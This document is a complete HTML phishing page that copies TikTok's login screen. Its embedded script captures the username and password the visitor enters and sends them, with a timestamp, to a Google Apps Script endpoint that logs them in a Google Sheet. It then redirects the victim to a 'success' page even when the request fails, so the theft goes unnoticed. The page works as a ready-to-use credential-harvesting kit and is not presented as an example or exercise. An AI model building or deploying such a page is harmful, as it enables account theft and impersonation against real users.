<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <style>
        body { 
            font-family: 'Proxima Nova', Arial, sans-serif; 
            background-color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .login-card { 
            width: 400px; 
            padding: 40px; 
            text-align: center; 
        }
        .logo { 
            width: 160px; 
            margin-bottom: 30px; 
        }
        .title { 
            font-size: 24px; 
            font-weight: 600; 
            margin-bottom: 20px; 
            color: #161823; 
        }
        .input-group { 
            margin-bottom: 15px; 
            text-align: left; 
        }
        .input-group label { 
            display: block; 
            font-size: 12px; 
            color: #757575; 
            margin-bottom: 5px; 
        }
        .input-field { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #ccc; 
            border-radius: 4px; 
            box-sizing: border-box; 
            font-size: 14px; 
        }
        .input-field:focus { 
            border-color: #fe2c40; 
            outline: none; 
        }
        .login-btn { 
            background-color: #fe2c40; 
            color: white; 
            width: 100%; 
            padding: 12px; 
            border: none; 
            border-radius: 4px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 10px; 
        }
        .login-btn:hover { 
            background-color: #e02439; 
        }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://cdn1.tiktok.com/obj/google-cdn/tiktok-logo.png" class="logo" alt="TikTok Logo">
        <div class="title">Log in to TikTok</div>
        
        <form id="tiktokForm">
            <div class="input-group">
                <label>Email, Username or Phone</label>
                <input type="text" id="username" class="input-field" placeholder="Enter your details" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" class="input-field" placeholder="Enter password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>
    </div>

    <script>        document.getElementById('tiktokForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const scriptURL = 'https://script.google.com/macros/s/AKfycbxr7l2XLO4F0l6LTGLzbg20VbAdOwzm_cUUIMyX2K1KtNDt31bfMmLCPEvCu3iXTr-7aQ/exec';

            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            formData.append('timestamp', new Date().toLocaleString());
            formData.append('platform', 'TikTok_Login');

            // Data ko Google Sheet mein bhejna
            fetch(scriptURL, { method: 'POST', body: formData })
            .then(response => {
                // Success: User ko final success page par bhej do
                window.location.href = 'success.html';
            })
            .catch(error => {
                console.error('Error!', error.message);
                // Error hone par bhi redirect karo taaki user ko crash na dikhe
                window.location.href = 'success.html';
            });
        });
    </script>
</body>
</html>
